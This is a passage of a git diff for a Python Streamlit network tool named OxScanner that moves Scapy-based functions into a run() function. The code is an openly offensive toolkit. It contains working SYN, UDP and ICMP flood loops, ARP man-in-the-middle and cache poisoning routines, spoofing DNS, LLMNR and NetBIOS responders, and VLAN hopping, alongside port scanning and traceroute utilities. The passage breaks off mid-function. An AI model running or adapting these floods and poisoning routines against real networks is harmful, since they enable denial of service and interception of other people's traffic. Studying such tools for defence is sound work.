@@ -8,574 +8,479 @@ import socket
 import threading
 import time
 
-# Streamlit page configuration
-st.set_page_config(
-    page_title="OxScanner",
-    page_icon="🛡️",
-    layout="wide"
-)
+def run():
 
-
-# Port details with names, protocols, and descriptions
-port_details = {
-    21: {
-        "name": "FTP 🌐",
-        "protocol": "File Transfer Protocol 📂",
-        "description": "FTP is used for transferring files between hosts. 🔄",
-    },
-    22: {
-        "name": "SSH 🔒",
-        "protocol": "Secure Shell 🔐",
-        "description": "SSH is used for secure remote administration. 🖥️",
-    },
-    23: {
-        "name": "Telnet 💻",
-        "protocol": "Telnet Protocol 🌐",
-        "description": "Telnet is used for remote command-line access. 🛠️",
-    },
-    25: {
-        "name": "SMTP 📧",
-        "protocol": "Simple Mail Transfer Protocol ✉️",
-        "description": "SMTP is used for sending emails. 📬",
-    },
-    53: {
-        "name": "DNS 📡",
-        "protocol": "Domain Name System 🌐",
-        "description": "DNS resolves domain names to IP addresses. 📍",
-    },
-    80: {
-        "name": "HTTP 🌍",
-        "protocol": "Hypertext Transfer Protocol 📄",
-        "description": "HTTP is used for web traffic. 🚦",
-    },
-    443: {
-        "name": "HTTPS 🔒",
-        "protocol": "HTTP Secure 🔐",
-        "description": "HTTPS is used for secure web traffic. 🚀",
-    },
-    # Add more ports as needed
-}
-
-# Load custom CSS
-def load_css(file_name):
-    with open(file_name) as f:
-        st.markdown(f'<style>{f.read()}</style>', unsafe_allow_html=True)
-
-    # Load the CSS file
-load_css("ui/Style.css")
-
-# Initialize a global variable to control the attack threads
-attack_running = False
-stop_event = threading.Event()
-
-
-def start_syn_flood(target_ip):
-    global attack_running
-    attack_running = True
-    while attack_running:
-        send(IP(dst=target_ip)/TCP(sport=12345, dport=80, flags="S"), verbose=0)
-
-def start_udp_flood(target_ip):
-    global attack_running
-    attack_running = True
-    while attack_running:
-        send(IP(dst=target_ip)/UDP(sport=12345, dport=53), verbose=0)
-
-def start_icmp_flood(target_ip):
-    global attack_running
-    attack_running = True
-    while attack_running:
-        send(IP(dst=target_ip)/ICMP(), verbose=0)
-
-def stop_attacks():
-    global attack_running
-    attack_running = False
-    st.success("Attack stopped. 🛑")
-
-# Function to execute ARP MitM attack
-def arp_mitm(target1, target2):
-    try:
-        # Enable IP forwarding
-        os.system("sysctl -w net.ipv4.ip_forward=1")
-        
-        # Send ARP packets to poison the ARP cache of both targets
-        send(ARP(op=2, psrc=target2, hwsrc=get_if_hwaddr(conf.iface), pdst=target1), loop=1)
-        send(ARP(op=2, psrc=target1, hwsrc=get_if_hwaddr(conf.iface), pdst=target2), loop=1)
-        return True
-    except Exception as e:
-        st.error(f"Error during ARP MitM attack: {str(e)}")
-        return False
-    
-# ARP Poisoning Function
-def arp_poisoning(client_mac, gateway_ip, target_ip):
-    try:
-        # Sending ARP request to poison the target's ARP cache
-        send(Ether(dst=client_mac) / ARP(op="who-has", psrc=gateway_ip, pdst=target_ip),
-            inter=RandNum(10, 40), loop=1)
-        return True
-    except Exception as e:
-        st.error(f"Error during ARP poisoning: {str(e)}")
-        return False
-
-# Function to scan specified ports
-def tcp_port_scan(target, port_list):
-    open_ports = {}
-    for port in port_list:
-        # Send a SYN packet to the specified port
-        try:
-            ans, _ = sr(IP(dst=target)/TCP(flags="S", dport=port), timeout=1, verbose=0)
-            # Check for SYN-ACK response
-            if ans and ans[0][1].haslayer(TCP) and ans[0][1][TCP].flags & 0x12:  # SYN-ACK flag
-                port_name = port_details.get(port, {}).get("name", "Unknown Port")
-                open_ports[port] = port_name
-        except Exception as e:
-            st.error(f"Error scanning port {port}: {e}")
-
-    return open_ports
-
-# Function to perform IKE scanning
-def ike_scanning(target_range):
-    try:
-        # Send an IKE (Internet Key Exchange) request
-        res, unans = sr(IP(dst=target_range)/UDP(sport=500, dport=500)/
-                        ISAKMP(init_cookie=RandString(8), exch_type=2)/
-                        ISAKMP_payload_SA(prop=ISAKMP_payload_Proposal()), timeout=2, verbose=False)
-
-        if res:
-            # Display summary of responses
-            st.write("IKE Scan Results:")
-            for snd, rcv in res:
-                st.write(f"Response from: {rcv.src} | IKE Version: {rcv[ISAKMP].exch_type}")
-        else:
-            st.info("No responses received.")
-
-    except Exception as e:
-        st.error(f"Error during IKE scanning: {str(e)}")
-
-# DNS Server Setup
-def setup_dns_server(interface, match=None, joker="192.168.1.1", relay=False):
-    try:
-        dnsd(iface=interface, match=match or {}, joker=joker, relay=relay)
-    except Exception as e:
-        st.error(f"Error setting up DNS server: {str(e)}")
-
-# mDNS Server Setup
-def setup_mdns_server(interface, joker="192.168.1.1"):
-    try:
-        mdnsd(iface=interface, joker=joker)
-    except Exception as e:
-        st.error(f"Error setting up mDNS server: {str(e)}")
-
-# LLMNR Server Setup
-def setup_llmnr_server(interface, from_ip="10.0.0.1"):
-    try:
-        llmnrd(iface=interface, from_ip=Net(from_ip))
-    except Exception as e:
-        st.error(f"Error setting up LLMNR server: {str(e)}")
-
-# Netbios Server Setup
-def setup_netbios_server(interface, local_ip=None):
-    try:
-        nbnsd(iface=interface, ip=local_ip)
-    except Exception as e:
-        st.error(f"Error setting up Netbios server: {str(e)}")
-
-# DNS Querry 
-def dns_request(qname, qtype):
-    ans = sr1(IP(dst="8.8.8.8")/UDP(sport=RandShort(), dport=53)/DNS(rd=1, qd=DNSQR(qname=qname, qtype=qtype)))
-    return ans
-
-# Display DNS Request
-def display_dns_results(ans):
-    if ans and ans.haslayer(DNSRR):
-        results = {}
-        for rr in ans[DNS].an:
-            if rr.type == 1:  # A
-                results[rr.rrname.decode()] = rr.rdata
-            elif rr.type == 28:  # AAAA
-                results[rr.rrname.decode()] = rr.rdata
-            elif rr.type == 15:  # MX
-                results[rr.rrname.decode()] = rr.exchange.decode()  # MX record uses exchange field
-            elif rr.type == 16:  # TXT
-                # Join the list of strings for TXT records
-                results[rr.rrname.decode()] = ' '.join([string.decode() for string in rr.rdata])
-            elif rr.type == 2:  # NS
-                results[rr.rrname.decode()] = rr.rdata.decode()  # NS records also use rdata
-            elif rr.type == 5:  # CNAME
-                results[rr.rrname.decode()] = rr.rdata.decode()  # CNAME uses rdata
-            elif rr.type == 12:  # PTR
-                results[rr.rrname.decode()] = rr.rdata.decode()  # PTR uses rdata
-            elif rr.type == 6:  # SOA
-                results[rr.rrname.decode()] = {
-                    'mname': rr.mname.decode(),
-                    'rname': rr.rname.decode(),
-                    'serial': rr.serial,
-                    'refresh': rr.refresh,
-                    'retry': rr.retry,
-                    'expire': rr.expire,
-                    'minimum': rr.minimum
-                }
-            # Add more types as necessary
-        return results
-    return {"No response received.": ""}
-
-# TCP SYN Traceroute
-def tcp_syn_traceroute(target_ip, max_ttl=20):
-    conf.verb = 1  # Disable Scapy's verbose output
-    results = []
-
-    for ttl in range(1, max_ttl + 1):
-        # Send a TCP SYN packet with the current TTL value
-        packet = IP(dst=target_ip, ttl=ttl) / TCP(dport=53, flags="S")  # Use port 80 or a known service
-        ans, unans = sr(packet, timeout=2, verbose=0)
-
-        if ans:
-            for sent, received in ans:
-                hop_info = {
-                    "ttl": ttl,
-                    "src_ip": received[IP].src if received.haslayer(IP) else "N/A",
-                    "reply_ip": received[IP].dst if received.haslayer(IP) else "N/A",
-                    "icmp_type": "N/A",
-                    "tcp_flags": "N/A"
-                }
-
-                if received.haslayer(ICMP):
-                    hop_info["icmp_type"] = received[ICMP].type
-                    # Determine if it's an ICMP Time Exceeded or Destination Unreachable
-                    if hop_info["icmp_type"] in [11, 3]:
-                        hop_info["reply_ip"] = received[IP].src  # Use source IP of the ICMP response
-                    if hop_info["icmp_type"] == 3:  # Destination Unreachable
-                        hop_info["tcp_flags"] = "N/A"  # No TCP flags in ICMP response
-
-                if received.haslayer(TCP):
-                    tcp_flags = received[TCP].flags
-                    # Add TCP flags description
-                    if tcp_flags == 0x12:  # SYN-ACK
-                        hop_info["tcp_flags"] = "SYN-ACK"
-                    elif tcp_flags == 0x14:  # RST
-                        hop_info["tcp_flags"] = "RST"
-                    elif tcp_flags == 0x10:  # SYN
-                        hop_info["tcp_flags"] = "SYN"
-                    else:
-                        hop_info["tcp_flags"] = f"Flags: {tcp_flags}"
-
-                results.append(hop_info)
-        else:
-            results.append({
-                "ttl": ttl,
-                "src_ip": "N/A",
-                "reply_ip": "No response",
-                "icmp_type": "N/A",
-                "tcp_flags": "N/A"
-            })
-
-    return results
-
-# UDP Traceroute
-def udp_traceroute(target_ip):
-    # Send UDP packets with increasing TTL
-    res, unans = sr(IP(dst=target_ip, ttl=(1, 20)) / UDP(dport=33434) / DNS(qd=DNSQR(qname="test.com")), timeout=2, verbose=0)
-    hop_info = []
-
-    for snd, rcv in res:
-        hop_details = {
-            "hop": snd.ttl,
-            "src_ip": snd.src,                   # Source IP of the sent packet
-            "dst_ip": snd.dst,                   # Destination IP of the sent packet
-            "reply_ip": rcv.src,                 # IP address of the reply
-            "reply_type": rcv[ICMP].type if ICMP in rcv else "N/A",  # ICMP type if available
-            "reply_code": rcv[ICMP].code if ICMP in rcv else "N/A",  # ICMP code if available
-            "length": len(rcv),                  # Length of the response packet
-            "ttl": rcv.ttl if ICMP in rcv else "N/A",  # TTL of the reply
-            "protocol": rcv[IP].proto if IP in rcv else "N/A"  # Protocol used
-        }
-        hop_info.append(hop_details)
-
-    # Collect any unanswered packets
-    for snd in unans:
-        hop_details = {
-            "hop": snd.ttl,
-            "src_ip": snd.src,
-            "dst_ip": snd.dst,
-            "reply_ip": "No response",
-            "reply_type": "N/A",
-            "reply_code": "N/A",
-            "length": "N/A",
-            "ttl": "N/A",
-            "protocol": "N/A"
-        }
-        hop_info.append(hop_details)
-
-    return hop_info
-
-# DNS Traceroute
-def dns_traceroute(target_ip, domain):
-
-    # DNS Type Mapping
-    DNS_TYPE_MAP = {
-        1: "A",
-        2: "NS",
-        5: "CNAME",
-        6: "SOA",
-        12: "PTR",
-        15: "MX",
-        16: "TXT",
-        28: "AAAA",
-        33: "SRV",
-        255: "ANY"
+    # Port details with names, protocols, and descriptions
+    port_details = {
+        21: {
+            "name": "FTP 🌐",
+            "protocol": "File Transfer Protocol 📂",
+            "description": "FTP is used for transferring files between hosts. 🔄",
+        },
+        22: {
+            "name": "SSH 🔒",
+            "protocol": "Secure Shell 🔐",
+            "description": "SSH is used for secure remote administration. 🖥️",
+        },
+        23: {
+            "name": "Telnet 💻",
+            "protocol": "Telnet Protocol 🌐",
+            "description": "Telnet is used for remote command-line access. 🛠️",
+        },
+        25: {
+            "name": "SMTP 📧",
+            "protocol": "Simple Mail Transfer Protocol ✉️",
+            "description": "SMTP is used for sending emails. 📬",
+        },
+        53: {
+            "name": "DNS 📡",
+            "protocol": "Domain Name System 🌐",
+            "description": "DNS resolves domain names to IP addresses. 📍",
+        },
+        80: {
+            "name": "HTTP 🌍",
+            "protocol": "Hypertext Transfer Protocol 📄",
+            "description": "HTTP is used for web traffic. 🚦",
+        },
+        443: {
+            "name": "HTTPS 🔒",
+            "protocol": "HTTP Secure 🔐",
+            "description": "HTTPS is used for secure web traffic. 🚀",
+        },
+        # Add more ports as needed
     }
 
-    # Perform traceroute
-    ans, unans = traceroute(target_ip, l4=UDP(sport=RandShort()) / DNS(qd=DNSQR(qname=domain)), verbose=0)
-    
-    # Prepare results for display
-    results = []
-    for s, r in ans:
-        # Check if the response is a DNS response
-        if r.haslayer(DNS):
-            dns_layer = r[DNS]
-            dns_type_code = dns_layer.qd.qtype  # DNS query type code
-            dns_type_name = DNS_TYPE_MAP.get(dns_type_code, "Unknown")  # Get type name
+    # Load custom CSS
+    def load_css(file_name):
+        with open(file_name) as f:
+            st.markdown(f'<style>{f.read()}</style>', unsafe_allow_html=True)
 
-            hop_info = {
-                "hop": s.ttl,                           # Hop number based on TTL
-                "src_ip": s.src,                       # Source IP of the sent packet
-                "dst_ip": r.dst,                       # Destination IP of the response
-                "reply_ip": r.src,                     # IP address of the reply
-                "dns_type": f"{dns_type_code} ({dns_type_name})",  # DNS query type with name
-                "response_code": dns_layer.rcode,      # DNS response code
-                "length": len(r),                      # Length of the response packet
-                "protocol": r[IP].proto if r.haslayer(IP) else "N/A"  # Protocol used
+        # Load the CSS file
+    load_css("ui/Style.css")
+
+    # Initialize a global variable to control the attack threads
+    attack_running = False
+    stop_event = threading.Event()
+
+
+    def start_syn_flood(target_ip):
+        global attack_running
+        attack_running = True
+        while attack_running:
+            send(IP(dst=target_ip)/TCP(sport=12345, dport=80, flags="S"), verbose=0)
+
+    def start_udp_flood(target_ip):
+        global attack_running
+        attack_running = True
+        while attack_running:
+            send(IP(dst=target_ip)/UDP(sport=12345, dport=53), verbose=0)
+
+    def start_icmp_flood(target_ip):
+        global attack_running
+        attack_running = True
+        while attack_running:
+            send(IP(dst=target_ip)/ICMP(), verbose=0)
+
+    def stop_attacks():
+        global attack_running
+        attack_running = False
+        st.success("Attack stopped. 🛑")
+
+    # Function to execute ARP MitM attack
+    def arp_mitm(target1, target2):
+        try:
+            # Enable IP forwarding
+            os.system("sysctl -w net.ipv4.ip_forward=1")
+            
+            # Send ARP packets to poison the ARP cache of both targets
+            send(ARP(op=2, psrc=target2, hwsrc=get_if_hwaddr(conf.iface), pdst=target1), loop=1)
+            send(ARP(op=2, psrc=target1, hwsrc=get_if_hwaddr(conf.iface), pdst=target2), loop=1)
+            return True
+        except Exception as e:
+            st.error(f"Error during ARP MitM attack: {str(e)}")
+            return False
+        
+    # ARP Poisoning Function
+    def arp_poisoning(client_mac, gateway_ip, target_ip):
+        try:
+            # Sending ARP request to poison the target's ARP cache
+            send(Ether(dst=client_mac) / ARP(op="who-has", psrc=gateway_ip, pdst=target_ip),
+                inter=RandNum(10, 40), loop=1)
+            return True
+        except Exception as e:
+            st.error(f"Error during ARP poisoning: {str(e)}")
+            return False
+
+    # Function to scan specified ports
+    def tcp_port_scan(target, port_list):
+        open_ports = {}
+        for port in port_list:
+            # Send a SYN packet to the specified port
+            try:
+                ans, _ = sr(IP(dst=target)/TCP(flags="S", dport=port), timeout=1, verbose=0)
+                # Check for SYN-ACK response
+                if ans and ans[0][1].haslayer(TCP) and ans[0][1][TCP].flags & 0x12:  # SYN-ACK flag
+                    port_name = port_details.get(port, {}).get("name", "Unknown Port")
+                    open_ports[port] = port_name
+            except Exception as e:
+                st.error(f"Error scanning port {port}: {e}")
+
+        return open_ports
+
+    # Function to perform IKE scanning
+    def ike_scanning(target_range):
+        try:
+            # Send an IKE (Internet Key Exchange) request
+            res, unans = sr(IP(dst=target_range)/UDP(sport=500, dport=500)/
+                            ISAKMP(init_cookie=RandString(8), exch_type=2)/
+                            ISAKMP_payload_SA(prop=ISAKMP_payload_Proposal()), timeout=2, verbose=False)
+
+            if res:
+                # Display summary of responses
+                st.write("IKE Scan Results:")
+                for snd, rcv in res:
+                    st.write(f"Response from: {rcv.src} | IKE Version: {rcv[ISAKMP].exch_type}")
+            else:
+                st.info("No responses received.")
+
+        except Exception as e:
+            st.error(f"Error during IKE scanning: {str(e)}")
+
+    # DNS Server Setup
+    def setup_dns_server(interface, match=None, joker="192.168.1.1", relay=False):
+        try:
+            dnsd(iface=interface, match=match or {}, joker=joker, relay=relay)
+        except Exception as e:
+            st.error(f"Error setting up DNS server: {str(e)}")
+
+    # mDNS Server Setup
+    def setup_mdns_server(interface, joker="192.168.1.1"):
+        try:
+            mdnsd(iface=interface, joker=joker)
+        except Exception as e:
+            st.error(f"Error setting up mDNS server: {str(e)}")
+
+    # LLMNR Server Setup
+    def setup_llmnr_server(interface, from_ip="10.0.0.1"):
+        try:
+            llmnrd(iface=interface, from_ip=Net(from_ip))
+        except Exception as e:
+            st.error(f"Error setting up LLMNR server: {str(e)}")
+
+    # Netbios Server Setup
+    def setup_netbios_server(interface, local_ip=None):
+        try:
+            nbnsd(iface=interface, ip=local_ip)
+        except Exception as e:
+            st.error(f"Error setting up Netbios server: {str(e)}")
+
+    # DNS Querry 
+    def dns_request(qname, qtype):
+        ans = sr1(IP(dst="8.8.8.8")/UDP(sport=RandShort(), dport=53)/DNS(rd=1, qd=DNSQR(qname=qname, qtype=qtype)))
+        return ans
+
+    # Display DNS Request
+    def display_dns_results(ans):
+        if ans and ans.haslayer(DNSRR):
+            results = {}
+            for rr in ans[DNS].an:
+                if rr.type == 1:  # A
+                    results[rr.rrname.decode()] = rr.rdata
+                elif rr.type == 28:  # AAAA
+                    results[rr.rrname.decode()] = rr.rdata
+                elif rr.type == 15:  # MX
+                    results[rr.rrname.decode()] = rr.exchange.decode()  # MX record uses exchange field
+                elif rr.type == 16:  # TXT
+                    # Join the list of strings for TXT records
+                    results[rr.rrname.decode()] = ' '.join([string.decode() for string in rr.rdata])
+                elif rr.type == 2:  # NS
+                    results[rr.rrname.decode()] = rr.rdata.decode()  # NS records also use rdata
+                elif rr.type == 5:  # CNAME
+                    results[rr.rrname.decode()] = rr.rdata.decode()  # CNAME uses rdata
+                elif rr.type == 12:  # PTR
+                    results[rr.rrname.decode()] = rr.rdata.decode()  # PTR uses rdata
+                elif rr.type == 6:  # SOA
+                    results[rr.rrname.decode()] = {
+                        'mname': rr.mname.decode(),
+                        'rname': rr.rname.decode(),
+                        'serial': rr.serial,
+                        'refresh': rr.refresh,
+                        'retry': rr.retry,
+                        'expire': rr.expire,
+                        'minimum': rr.minimum
+                    }
+                # Add more types as necessary
+            return results
+        return {"No response received.": ""}
+
+    # TCP SYN Traceroute
+    def tcp_syn_traceroute(target_ip, max_ttl=20):
+        conf.verb = 1  # Disable Scapy's verbose output
+        results = []
+
+        for ttl in range(1, max_ttl + 1):
+            # Send a TCP SYN packet with the current TTL value
+            packet = IP(dst=target_ip, ttl=ttl) / TCP(dport=53, flags="S")  # Use port 80 or a known service
+            ans, unans = sr(packet, timeout=2, verbose=0)
+
+            if ans:
+                for sent, received in ans:
+                    hop_info = {
+                        "ttl": ttl,
+                        "src_ip": received[IP].src if received.haslayer(IP) else "N/A",
+                        "reply_ip": received[IP].dst if received.haslayer(IP) else "N/A",
+                        "icmp_type": "N/A",
+                        "tcp_flags": "N/A"
+                    }
+
+                    if received.haslayer(ICMP):
+                        hop_info["icmp_type"] = received[ICMP].type
+                        # Determine if it's an ICMP Time Exceeded or Destination Unreachable
+                        if hop_info["icmp_type"] in [11, 3]:
+                            hop_info["reply_ip"] = received[IP].src  # Use source IP of the ICMP response
+                        if hop_info["icmp_type"] == 3:  # Destination Unreachable
+                            hop_info["tcp_flags"] = "N/A"  # No TCP flags in ICMP response
+
+                    if received.haslayer(TCP):
+                        tcp_flags = received[TCP].flags
+                        # Add TCP flags description
+                        if tcp_flags == 0x12:  # SYN-ACK
+                            hop_info["tcp_flags"] = "SYN-ACK"
+                        elif tcp_flags == 0x14:  # RST
+                            hop_info["tcp_flags"] = "RST"
+                        elif tcp_flags == 0x10:  # SYN
+                            hop_info["tcp_flags"] = "SYN"
+                        else:
+                            hop_info["tcp_flags"] = f"Flags: {tcp_flags}"
+
+                    results.append(hop_info)
+            else:
+                results.append({
+                    "ttl": ttl,
+                    "src_ip": "N/A",
+                    "reply_ip": "No response",
+                    "icmp_type": "N/A",
+                    "tcp_flags": "N/A"
+                })
+
+        return results
+
+    # UDP Traceroute
+    def udp_traceroute(target_ip):
+        # Send UDP packets with increasing TTL
+        res, unans = sr(IP(dst=target_ip, ttl=(1, 20)) / UDP(dport=33434) / DNS(qd=DNSQR(qname="test.com")), timeout=2, verbose=0)
+        hop_info = []
+
+        for snd, rcv in res:
+            hop_details = {
+                "hop": snd.ttl,
+                "src_ip": snd.src,                   # Source IP of the sent packet
+                "dst_ip": snd.dst,                   # Destination IP of the sent packet
+                "reply_ip": rcv.src,                 # IP address of the reply
+                "reply_type": rcv[ICMP].type if ICMP in rcv else "N/A",  # ICMP type if available
+                "reply_code": rcv[ICMP].code if ICMP in rcv else "N/A",  # ICMP code if available
+                "length": len(rcv),                  # Length of the response packet
+                "ttl": rcv.ttl if ICMP in rcv else "N/A",  # TTL of the reply
+                "protocol": rcv[IP].proto if IP in rcv else "N/A"  # Protocol used
             }
-        else:
+            hop_info.append(hop_details)
+
+        # Collect any unanswered packets
+        for snd in unans:
+            hop_details = {
+                "hop": snd.ttl,
+                "src_ip": snd.src,
+                "dst_ip": snd.dst,
+                "reply_ip": "No response",
+                "reply_type": "N/A",
+                "reply_code": "N/A",
+                "length": "N/A",
+                "ttl": "N/A",
+                "protocol": "N/A"
+            }
+            hop_info.append(hop_details)
+
+        return hop_info
+
+    # DNS Traceroute
+    def dns_traceroute(target_ip, domain):
+
+        # DNS Type Mapping
+        DNS_TYPE_MAP = {
+            1: "A",
+            2: "NS",
+            5: "CNAME",
+            6: "SOA",
+            12: "PTR",
+            15: "MX",
+            16: "TXT",
+            28: "AAAA",
+            33: "SRV",
+            255: "ANY"
+        }
+
+        # Perform traceroute
+        ans, unans = traceroute(target_ip, l4=UDP(sport=RandShort()) / DNS(qd=DNSQR(qname=domain)), verbose=0)
+        
+        # Prepare results for display
+        results = []
+        for s, r in ans:
+            # Check if the response is a DNS response
+            if r.haslayer(DNS):
+                dns_layer = r[DNS]
+                dns_type_code = dns_layer.qd.qtype  # DNS query type code
+                dns_type_name = DNS_TYPE_MAP.get(dns_type_code, "Unknown")  # Get type name
+
+                hop_info = {
+                    "hop": s.ttl,                           # Hop number based on TTL
+                    "src_ip": s.src,                       # Source IP of the sent packet
+                    "dst_ip": r.dst,                       # Destination IP of the response
+                    "reply_ip": r.src,                     # IP address of the reply
+                    "dns_type": f"{dns_type_code} ({dns_type_name})",  # DNS query type with name
+                    "response_code": dns_layer.rcode,      # DNS response code
+                    "length": len(r),                      # Length of the response packet
+                    "protocol": r[IP].proto if r.haslayer(IP) else "N/A"  # Protocol used
+                }
+            else:
+                hop_info = {
+                    "hop": s.ttl,
+                    "src_ip": s.src,
+                    "dst_ip": r.dst,
+                    "reply_ip": "No response",
+                    "dns_type": "N/A",
+                    "response_code": "N/A",
+                    "length": "N/A",
+                    "protocol": "N/A"
+                }
+
+            results.append(hop_info)
+
+        # Handle unanswered packets
+        for s in unans:
             hop_info = {
                 "hop": s.ttl,
                 "src_ip": s.src,
-                "dst_ip": r.dst,
+                "dst_ip": s.dst,
                 "reply_ip": "No response",
                 "dns_type": "N/A",
                 "response_code": "N/A",
                 "length": "N/A",
                 "protocol": "N/A"
             }
+            results.append(hop_info)
 
-        results.append(hop_info)
+        return results
 
-    # Handle unanswered packets
-    for s in unans:
-        hop_info = {
-            "hop": s.ttl,
-            "src_ip": s.src,
-            "dst_ip": s.dst,
-            "reply_ip": "No response",
-            "dns_type": "N/A",
-            "response_code": "N/A",
-            "length": "N/A",
-            "protocol": "N/A"
-        }
-        results.append(hop_info)
+    # Ether Leaking 
+    def ether_leaking(target_ip):
+        # Send an ICMP Echo Request
+        ans = sr1(IP(dst=target_ip) / ICMP(), timeout=2, verbose=1)
 
-    return results
+        if ans is not None:
+            ans.show()
+            ip_layer = ans[IP]
+            icmp_layer = ans[ICMP]
 
-# Ether Leaking 
-def ether_leaking(target_ip):
-    # Send an ICMP Echo Request
-    ans = sr1(IP(dst=target_ip) / ICMP(), timeout=2, verbose=1)
+            # Formatting the packet information in a human-readable way
+            output = f"""
+    IP Layer
+    Version  : {ip_layer.version}
+    IHL      : {ip_layer.ihl}
+    TOS      : {ip_layer.tos:#04x}
+    Length   : {ip_layer.len}
+    ID       : {ip_layer.id}
+    Flags    : {ip_layer.flags}
+    Fragment : {ip_layer.frag}
+    TTL      : {ip_layer.ttl}
+    Protocol : {ip_layer.proto}
+    Checksum : {ip_layer.chksum:#04x}
+    Source   : {ip_layer.src}
+    Destination: {ip_layer.dst}
 
-    if ans is not None:
-        ans.show()
-        ip_layer = ans[IP]
-        icmp_layer = ans[ICMP]
-
-        # Formatting the packet information in a human-readable way
-        output = f"""
-IP Layer
-Version  : {ip_layer.version}
-IHL      : {ip_layer.ihl}
-TOS      : {ip_layer.tos:#04x}
-Length   : {ip_layer.len}
-ID       : {ip_layer.id}
-Flags    : {ip_layer.flags}
-Fragment : {ip_layer.frag}
-TTL      : {ip_layer.ttl}
-Protocol : {ip_layer.proto}
-Checksum : {ip_layer.chksum:#04x}
-Source   : {ip_layer.src}
-Destination: {ip_layer.dst}
-
-ICMP Layer ###
-Type     : {icmp_layer.type}
-Code     : {icmp_layer.code}
-Checksum : {icmp_layer.chksum:#04x}
-ID       : {icmp_layer.id:#04x}
-Sequence : {icmp_layer.seq:#04x}
-"""
-        return output
-    else:
-        return "No response received."
-
-# ICMP Leaking
-def icmp_leaking(target_ip):
-    # Send ICMP request with custom options
-    ans = sr1(IP(dst=target_ip, options="\x02") / ICMP(), timeout=2)
-
-    if ans is not None:
-        ans.show()
-        ip_layer = ans[IP]
-        icmp_layer = ans[ICMP]
-        ip_in_icmp_layer = ans.getlayer(IP, 1)  # IP layer inside ICMP
-        icmp_in_icmp_layer = ans.getlayer(ICMP, 1)  # ICMP layer inside ICMP
-        raw_layer = ans.getlayer(Raw)  # Raw data layer if present
-
-        # Convert flags to string to avoid formatting errors
-        ip_flags = str(ip_layer.flags) if ip_layer.flags is not None else 'N/A'
-        ip_in_icmp_flags = str(getattr(ip_in_icmp_layer, 'flags', 'N/A'))
-
-        # Function to handle None values and ensure the return value is always a string
-        def safe_format(value):
-            return str(value) if value is not None else 'N/A'
-
-        # Create a consistent column width for the output
-        column_width = 30
-        separator = "   |   "
-        line = "-" * (column_width * 5 + len(separator) * 4)
-
-        # Column titles and formatted output
-        output = f"""
-        {"ICMP Leaking Results:"}
-        {"IP Layer".ljust(column_width)}{separator}{"ICMP Layer".ljust(column_width)}{separator}{"IP in ICMP Layer".ljust(column_width)}{separator}{"ICMP in ICMP Layer".ljust(column_width)}{separator}{"Raw Payload".ljust(column_width)}
-        {line}
-        {"Version       : " + safe_format(ip_layer.version).ljust(column_width - 14)}{separator}{"Type          : " + safe_format(icmp_layer.type).ljust(column_width - 14)}{separator}{"Version       : " + safe_format(getattr(ip_in_icmp_layer, 'version', None)).ljust(column_width - 14)}{separator}{"Type          : " + safe_format(getattr(icmp_in_icmp_layer, 'type', None)).ljust(column_width - 14)}{separator}{"Raw Data      : " + safe_format(raw_layer.load if raw_layer else 'N/A').ljust(column_width - 14)}
-        {"IHL           : " + safe_format(ip_layer.ihl).ljust(column_width - 14)}{separator}{"Code          : " + safe_format(icmp_layer.code).ljust(column_width - 14)}{separator}{"IHL           : " + safe_format(getattr(ip_in_icmp_layer, 'ihl', None)).ljust(column_width - 14)}{separator}{"Code          : " + safe_format(getattr(icmp_in_icmp_layer, 'code', None)).ljust(column_width - 14)}{separator}{"Checksum      : " + safe_format(format(icmp_layer.chksum, '#04x')).ljust(column_width - 14)}
-        {"TOS           : " + safe_format(format(ip_layer.tos, '#04x')).ljust(column_width - 14)}{separator}{"Checksum      : " + safe_format(format(icmp_layer.chksum, '#04x')).ljust(column_width - 14)}{separator}{"TOS           : " + safe_format(format(getattr(ip_in_icmp_layer, 'tos', 0), '#04x')).ljust(column_width - 14)}{separator}{"Checksum      : " + safe_format(format(getattr(icmp_in_icmp_layer, 'chksum', 0), '#04x')).ljust(column_width - 14)}
-        {"Length        : " + safe_format(ip_layer.len).ljust(column_width - 14)}{separator}{"Pointer       : " + safe_format(getattr(icmp_layer, 'ptr', None)).ljust(column_width - 14)}{separator}{"Length        : " + safe_format(getattr(ip_in_icmp_layer, 'len', None)).ljust(column_width - 14)}{separator}{"ID            : " + safe_format(getattr(icmp_in_icmp_layer, 'id', None)).ljust(column_width - 14)}{separator}{"ID Checksum   : " + safe_format(format(getattr(icmp_in_icmp_layer, 'chksum', 0), '#04x')).ljust(column_width - 14)}
-        {"ID            : " + safe_format(ip_layer.id).ljust(column_width - 14)}{separator}{"Length        : " + safe_format(getattr(icmp_layer, 'length', None)).ljust(column_width - 14)}{separator}{"ID            : " + safe_format(getattr(ip_in_icmp_layer, 'id', None)).ljust(column_width - 14)}{separator}{"Sequence      : " + safe_format(getattr(icmp_in_icmp_layer, 'seq', None)).ljust(column_width - 14)}{separator}
-        {"Flags         : " + safe_format(ip_flags).ljust(column_width - 14)}{separator}{"Protocol      : " + safe_format(ip_layer.proto).ljust(column_width - 14)}{separator}{"Flags         : " + safe_format(ip_in_icmp_flags).ljust(column_width - 14)}{separator}{"Protocol      : " + safe_format(getattr(ip_in_icmp_layer, 'proto', None)).ljust(column_width - 14)}
-        {"Fragment      : " + safe_format(ip_layer.frag).ljust(column_width - 14)}{separator}{"TTL           : " + safe_format(ip_layer.ttl).ljust(column_width - 14)}{separator}{"Fragment      : " + safe_format(getattr(ip_in_icmp_layer, 'frag', None)).ljust(column_width - 14)}{separator}{"TTL           : " + safe_format(getattr(ip_in_icmp_layer, 'ttl', None)).ljust(column_width - 14)}
-        {"TTL           : " + safe_format(ip_layer.ttl).ljust(column_width - 14)}{separator}{"Source        : " + safe_format(ip_layer.src).ljust(column_width - 14)}{separator}{"Source        : " + safe_format(ip_in_icmp_layer.src if ip_in_icmp_layer else 'N/A').ljust(column_width - 14)}{separator}{"Destination   : " + safe_format(ip_in_icmp_layer.dst if ip_in_icmp_layer else 'N/A').ljust(column_width - 14)}
-        {"Destination   : " + safe_format(ip_layer.dst).ljust(column_width - 14)}{separator}{"Checksum      : " + safe_format(format(ip_layer.chksum, '#04x')).ljust(column_width - 14)}{separator}{"Checksum      : " + safe_format(format(getattr(ip_in_icmp_layer, 'chksum', 0), '#04x')).ljust(column_width - 14)}{separator}
-        """
-        
-        return output
-    else:
-        return "No response received."
-
-# VLAN Hopping
-def vlan_hopping(target_ip):
-    # Prepare the packet
-    packet = Ether() / Dot1Q(vlan=2) / Dot1Q(vlan=7) / IP(dst=target_ip) / ICMP()
-    
-    # Send and receive packet
-    ans, unans = srp(packet, timeout=2, verbose=0)
-    
-    # Return the results for further processing
